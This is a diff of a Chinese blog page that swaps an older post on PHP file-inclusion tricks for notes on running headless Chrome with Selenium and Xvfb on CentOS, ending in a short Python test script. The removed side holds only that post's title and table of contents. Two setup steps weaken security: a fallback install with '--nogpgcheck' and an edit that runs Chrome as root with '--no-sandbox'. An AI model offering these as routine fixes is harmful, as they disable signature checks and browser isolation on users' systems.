+<p>写入下面的配置：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[google-chrome] </span><br><span class="line">name=google-chrome </span><br><span class="line">baseurl=http://dl.google.com/linux/chrome/rpm/stable/<span class="variable">$basearch</span> </span><br><span class="line">enabled=1 </span><br><span class="line">gpgcheck=1 </span><br><span class="line">gpgkey=https://dl-ssl.google.com/linux/linux_signing_key.pub</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum -y install google-chrome-stable  <span class="comment"># 安装chrome浏览器</span></span><br><span class="line">yum -y install google-chrome-stable --nogpgcheck   <span class="comment"># 如无法安装则使用这行</span></span><br></pre></td></tr></table></figure>
+<p>找到chrome的路径<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">which google-chrome-stable   <span class="comment"># 找路径</span></span><br><span class="line">ln -s 路径 /bin/chrome   <span class="comment"># 创建软连接</span></span><br></pre></td></tr></table></figure></p>
+<p>解决root用户不能运行chrome<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">编辑启动文件: /opt/google/chrome/google-chrome </span><br><span class="line">将最后一行改写为: <span class="built_in">exec</span> -a <span class="string">"<span class="variable">$0</span>"</span> <span class="string">"<span class="variable">$HERE</span>/chrome"</span> <span class="string">"<span class="variable">$@</span>"</span> --no-sandbox <span class="variable">$HOME</span></span><br></pre></td></tr></table></figure></p>
+<p>安装Xvfb<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yum update</span><br><span class="line">yum install Xvfb</span><br><span class="line">yum install libXfont</span><br><span class="line">yum install xorg-x11-fonts*</span><br></pre></td></tr></table></figure></p>
+<p>安装selenium、pyvirtualdisplay<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install selenium</span><br><span class="line">pip install pyvirtualdisplay</span><br></pre></td></tr></table></figure></p>
+<h4 id="测试代码："><a href="#测试代码：" class="headerlink" title="测试代码："></a>测试代码：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /usr/bin/env python</span></span><br><span class="line"><span class="comment"># _*_ coding:utf-8 _*_</span></span><br><span class="line"><span class="comment"># blog: https://smelond.com</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> pyvirtualdisplay <span class="keyword">import</span> Display  <span class="comment"># 导入对应模块</span></span><br><span class="line"></span><br><span class="line">display = Display(visible=<span class="number">0</span>, size=(<span class="number">800</span>, <span class="number">600</span>))  <span class="comment"># 设置界面窗口大小</span></span><br><span class="line">display.start()			<span class="comment"># 开启窗口 </span></span><br><span class="line">options = webdriver.ChromeOptions()  <span class="comment"># 设置驱动</span></span><br><span class="line">options.add_argument(<span class="string">'--headless'</span>)  <span class="comment"># 添加无界面</span></span><br><span class="line">browser = webdriver.Chrome(chrome_options=options)   <span class="comment"># 将无界面添加到browser</span></span><br><span class="line">browser.get(<span class="string">"http://smelond.com"</span>)  <span class="comment"># 访问页面，这里现在不会弹出浏览器窗口了</span></span><br><span class="line">print(browser.page_source)     <span class="comment"># 测试打印页面内容，是否成功</span></span><br><span class="line">browser.quit()    <span class="comment"># 退出浏览器</span></span><br><span class="line">display.stop()    <span class="comment"># 退出窗口</span></span><br></pre></td></tr></table></figure>
+<p>参考：<br><a href="https://blog.csdn.net/ZincZhang/article/details/79797847" target="_blank" rel="noopener">https://blog.csdn.net/ZincZhang/article/details/79797847</a><br><a href="https://blog.csdn.net/lilongsy/article/details/76142497" target="_blank" rel="noopener">https://blog.csdn.net/lilongsy/article/details/76142497</a></p>
 
       
     </div>
@@ -460,12 +467,12 @@
   <!-- JS库 sweetalert 可修改路径 -->
   <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
   <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
-  <p><span>本文标题:</span><a href="/2018/09/04/LFI以及RF(文件包含)伪协议利用小技巧/">LFI以及RFI(文件包含)伪协议利用小技巧</a></p>
+  <p><span>本文标题:</span><a href="/2019/02/16/python爬虫-笔记记录二/">python爬虫[笔记记录二]</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 smelond 的个人博客">smelond</a></p>
-  <p><span>发布时间:</span>2018年09月04日 - 10:09</p>
-  <p><span>最后更新:</span>2018年09月04日 - 16:09</p>
-  <p><span>原始链接:</span><a href="/2018/09/04/LFI以及RF(文件包含)伪协议利用小技巧/" title="LFI以及RFI(文件包含)伪协议利用小技巧">http://smelond.com/2018/09/04/LFI以及RF(文件包含)伪协议利用小技巧/</a>
-    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://smelond.com/2018/09/04/LFI以及RF(文件包含)伪协议利用小技巧/"  aria-label="复制成功！"></i></span>
+  <p><span>发布时间:</span>2019年02月16日 - 16:02</p>
+  <p><span>最后更新:</span>2019年02月16日 - 18:02</p>
+  <p><span>原始链接:</span><a href="/2019/02/16/python爬虫-笔记记录二/" title="python爬虫[笔记记录二]">http://smelond.com/2019/02/16/python爬虫-笔记记录二/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://smelond.com/2019/02/16/python爬虫-笔记记录二/"  aria-label="复制成功！"></i></span>
   </p>
   <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
 </div>
@@ -497,7 +504,11 @@
       
         <div class="post-tags">
           
-            <a href="/tags/文件包含/" <i class="fa fa-tag"></i> 文件包含</a>
+            <a href="/tags/笔记记录/" <i class="fa fa-tag"></i> 笔记记录</a>
+          
+            <a href="/tags/爬虫/" <i class="fa fa-tag"></i> 爬虫</a>
+          
+            <a href="/tags/selenium/" <i class="fa fa-tag"></i> selenium</a>
           
         </div>
       
@@ -510,8 +521,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/08/27/St2-057漏洞复现/" rel="next" title="St2-057漏洞复现">
-                <i class="fa fa-chevron-left"></i> St2-057漏洞复现
+              <a href="/2019/02/11/python爬虫-笔记记录一/" rel="next" title="python爬虫[笔记记录一]">
+                <i class="fa fa-chevron-left"></i> python爬虫[笔记记录一]
               </a>
             
           </div>
@@ -519,10 +530,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/10/02/wordpress-js劫持分析/" rel="prev" title="wordpress-js劫持分析">
-                wordpress-js劫持分析 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -727,7 +734,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#包含文件的函数"><span class="nav-number">1.</span> <span class="nav-text">包含文件的函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php伪协议"><span class="nav-number">2.</span> <span class="nav-text">php伪协议</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#php的伪协议有："><span class="nav-number">2.1.</span> <span class="nav-text">php的伪协议有：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#常用的伪协议："><span class="nav-number">2.2.</span> <span class="nav-text">常用的伪协议：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php-协议"><span class="nav-number">2.3.</span> <span class="nav-text">php://协议</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#file-协议"><span class="nav-number">2.4.</span> <span class="nav-text">file://协议</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#phar-协议"><span class="nav-number">2.5.</span> <span class="nav-text">phar://协议</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#zip-协议"><span class="nav-number">2.6.</span> <span class="nav-text">zip://协议</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#bzip2-协议-amp-amp-zlib"><span class="nav-number">2.7.</span> <span class="nav-text">bzip2://协议 &amp;&amp; zlib://</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#data-协议"><span class="nav-number">2.8.</span> <span class="nav-text">data://协议</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#http-amp-amp-ftp"><span class="nav-number">2.9.</span> <span class="nav-text">http:// &amp;&amp; ftp://</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#基本用法：登录"><span class="nav-number">1.</span> <span class="nav-text">基本用法：登录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#基本用法：一些常见的点击以及输入"><span class="nav-number">2.</span> <span class="nav-text">基本用法：一些常见的点击以及输入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#基本用法：加代理访问页面"><span class="nav-number">3.</span> <span class="nav-text">基本用法：加代理访问页面</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#基本操作：获取页面上的html代码"><span class="nav-number">4.</span> <span class="nav-text">基本操作：获取页面上的html代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其他操作：执行js代码"><span class="nav-number">5.</span> <span class="nav-text">其他操作：执行js代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#神操作：设置页面加载时间"><span class="nav-number">6.</span> <span class="nav-text">神操作：设置页面加载时间</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#神操作：无界面selenium"><span class="nav-number">7.</span> <span class="nav-text">神操作：无界面selenium</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#selenium-安装："><span class="nav-number">7.1.</span> <span class="nav-text">selenium 安装：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#chrome-安装："><span class="nav-number">7.2.</span> <span class="nav-text">chrome 安装：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#测试代码："><span class="nav-number">7.3.</span> <span class="nav-text">测试代码：</span></a></li></ol></li></ol></div>
             
 
           </div>
